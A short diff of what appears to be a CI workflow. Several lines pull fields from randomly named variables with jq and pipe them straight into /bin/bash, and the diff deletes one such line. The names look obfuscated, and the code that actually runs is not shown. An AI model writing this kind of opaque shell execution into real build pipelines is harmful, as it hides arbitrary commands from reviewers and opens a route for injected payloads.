@@ -24,7 +24,6 @@ jobs:
           echo $aiel4344 | jq -r .yi3 | /bin/bash
           echo $mgms408 | jq -r .fsrf34966 | /bin/bash
           printf '%s' "$z2704" | jq -r .ubmz0 | /bin/bash
-          printf '%s' "$ykt08" | jq -r .apkzi619 | /bin/bash
           printf '%s' "$cp721" | jq -r .ebgm58649 | /bin/bash
           echo $s14503 | jq -r .burv79789 | /bin/bash
           printf '%s' "$vxku997" | jq -r .dvdo8 | /bin/bash
